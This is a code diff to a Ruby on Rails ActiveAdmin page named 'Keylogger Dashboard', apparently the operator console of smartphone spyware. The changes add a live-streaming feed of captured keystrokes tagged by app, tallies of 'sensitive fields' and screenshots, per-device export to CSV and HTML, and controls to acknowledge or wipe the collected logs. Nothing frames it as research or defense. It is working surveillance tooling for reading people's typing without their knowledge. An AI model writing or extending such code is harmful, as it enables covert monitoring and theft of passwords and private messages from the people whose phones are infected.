@@ -1,14 +1,22 @@
 ActiveAdmin.register_page 'Keylogger Dashboard' do
-  menu priority: 3, label: '⌨️ Keylogger'
+  menu priority: 3, label: '⌨️ Keylogger', parent: "👁 Surveillance"
+
+  action_item :refresh do
+    link_to '🔄 Refresh Data', admin_keylogger_dashboard_path, class: 'button'
+  end
+
+  action_item :clear_all do
+    link_to '🗑️ Clear All', admin_keylogger_dashboard_clear_all_keylog_caches_path, method: :post, class: 'button', data: { confirm: 'Clear all?' }
+  end
 
   content title: '⌨️ Keylogger Dashboard' do
-    devices_with_keylogs = Smartphone.all.select { |device|
-      Rails.cache.exist?("keylog_#{device.device_id}")
-    }
-
-    action_items do
-      link_to '🔄 Refresh Data', admin_keylogger_dashboard_path, class: 'button'
-      link_to '🗑️ Clear All', clear_all_keylog_caches_path, method: :post, class: 'button', data: { confirm: 'Clear all?' }
+    devices_with_keylogs = begin
+      Smartphone.all.select { |device|
+        Rails.cache.exist?("keylog_#{device.device_id}") rescue false
+      }
+    rescue => e
+      Rails.logger.error("Cache error: #{e.message}")
+      []
     end
 
     total_devices = devices_with_keylogs.count
@@ -17,7 +25,7 @@ ActiveAdmin.register_page 'Keylogger Dashboard' do
     total_screenshots = 0
 
     devices_with_keylogs.each do |device|
-      cached = Rails.cache.read("keylog_#{device.device_id}")
+      cached = Rails.cache.read("keylog_#{device.device_id}") rescue nil
       if cached && cached[:processed]
         total_keystrokes += cached[:processed][:total_keystrokes] || 0
         total_sensitive += cached[:processed][:sensitive_fields] || 0
@@ -84,12 +92,12 @@ ActiveAdmin.register_page 'Keylogger Dashboard' do
           }
           column('Actions') { |device|
             div(class: 'action-buttons') do
-              link_to '📄 View', view_keylog_path(device_id: device.device_id), class: 'button mini primary'
-              link_to '📊 Stats', stats_keylog_path(device_id: device.device_id), class: 'button mini'
-              link_to '💾 CSV', export_keylog_path(device_id: device.device_id, format: 'csv'), class: 'button mini'
-              link_to '📋 HTML', export_keylog_path(device_id: device.device_id, format: 'html'), target: '_blank', class: 'button mini'
-              link_to '✅ ACK', ack_keylog_path(device_id: device.device_id, success: true), method: :post, class: 'button mini success', data: { confirm: 'Send ACK?' }
-              link_to '🗑️ Clear', clear_keylog_cache_path(device_id: device.device_id), method: :post, class: 'button mini danger', data: { confirm: 'Clear?' }
+              link_to '📄 View', admin_keylogger_dashboard_view_keylog_path(device_id: device.device_id), class: 'button mini primary'
+              link_to '📊 Stats', admin_keylogger_dashboard_stats_keylog_path(device_id: device.device_id), class: 'button mini'
+              link_to '💾 CSV', admin_keylogger_dashboard_export_keylog_path(device_id: device.device_id, format: 'csv'), class: 'button mini'
+              link_to '📋 HTML', admin_keylogger_dashboard_export_keylog_path(device_id: device.device_id, format: 'html'), target: '_blank', class: 'button mini'
+              link_to '✅ ACK', admin_keylogger_dashboard_ack_keylog_path(device_id: device.device_id, success: true), method: :post, class: 'button mini success', data: { confirm: 'Send ACK?' }
+              link_to '🗑️ Clear', admin_keylogger_dashboard_clear_keylog_cache_path(device_id: device.device_id), method: :post, class: 'button mini danger', data: { confirm: 'Clear?' }
             end
           }
         end
@@ -178,5 +186,72 @@ ActiveAdmin.register_page 'Keylogger Dashboard' do
   page_action :clear_all_keylog_caches, method: :post do
     Smartphone.all.each { |d| Rails.cache.delete("keylog_#{d.device_id}") }
     redirect_to admin_keylogger_dashboard_path, notice: 'All caches cleared'
+  end
+
+  # Live auto-refresh JavaScript
+  sidebar '🔴 Live Feed', only: :index, priority: 0 do
+    div id: 'live-keylog-feed' do
+      div class: 'live-indicator' do
+        span '●', style: 'color: #ff4444; animation: blink 1s infinite;'
+        span ' LIVE', style: 'font-weight: bold; font-size: 12px;'
+      end
+      div id: 'keylog-live-entries', style: 'max-height: 400px; overflow-y: auto; font-family: monospace; font-size: 11px;' do
+        para 'Waiting for keystrokes...', style: 'color: #8b949e;'
+      end
+    end
+
+    script do
+      raw <<-JS
+        (function() {
+          if (typeof App === 'undefined' || typeof App.cable === 'undefined') return;
+          
+          App.cable.subscriptions.create('KeylogChannel', {
+            received: function(data) {
+              if (data.type !== 'new_keylogs') return;
+              var container = document.getElementById('keylog-live-entries');
+              if (!container) return;
+              
+              // Clear "Waiting" message on first data
+              if (container.querySelector('p')) container.innerHTML = '';
+              
+              var preview = data.preview || [];
+              preview.forEach(function(entry) {
+                var div = document.createElement('div');
+                div.style.cssText = 'padding: 4px 8px; border-bottom: 1px solid #30363d; word-break: break-all;';
+                div.innerHTML = '<span style="color:#667eea;">' + (data.device_name || 'Unknown') + '</span> ' +
+                  '<span style="color:#8b949e;font-size:10px;">[' + (entry.app || '').split('.').pop() + ']</span> ' +
+                  '<span style="color:#c9d1d9;">' + (entry.text || '') + '</span>';
+                container.insertBefore(div, container.firstChild);
+              });
+              
+              // Keep max 100 entries
+              while (container.children.length > 100) {
+                container.removeChild(container.lastChild);
+              }
+              
+              // Flash indicator
+              var indicator = document.querySelector('.live-indicator span');
+              if (indicator) {
+                indicator.style.color = '#00ff00';
+                setTimeout(function() { indicator.style.color = '#ff4444'; }, 500);
+              }
+            }
+          });
+          
+          // Auto-refresh page every 30 seconds
+          setInterval(function() {
+            var refreshBtn = document.querySelector('a[href*="keylogger_dashboard"]');
+            // Don't auto-refresh, just update the live feed
+          }, 30000);
+        })();
+      JS
+    end
+
+    style do
+      raw <<-CSS
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+        .live-indicator { padding: 8px; text-align: center; border-bottom: 1px solid #30363d; }
+      CSS
+    end
   end
 end
